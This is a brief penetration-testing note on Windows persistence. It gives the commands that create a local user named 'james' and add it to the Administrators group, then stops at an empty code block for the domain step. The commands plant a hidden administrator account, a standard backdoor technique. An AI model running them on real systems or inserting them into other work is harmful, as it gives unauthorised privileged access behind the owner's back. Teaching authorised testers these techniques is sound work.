**Persistence:**

Persistence methods can be as simple as adding a user to a system or as advanced as kernel-level rootkit that hides itself even from the Windows API making it virtually undetectable

1. Adding a User 

```
C:\Documents and Settings\Desktop> net user james password /add
```

   2. Add our new user to the relevant groups

```
C:\Documents and Settings\Desktop> net localgroup Administrators james /add
```

   3. If your client has a Windows domain, you can add users to the domain and add them to domain groups \(if u have sufficient privileges\)

```

```



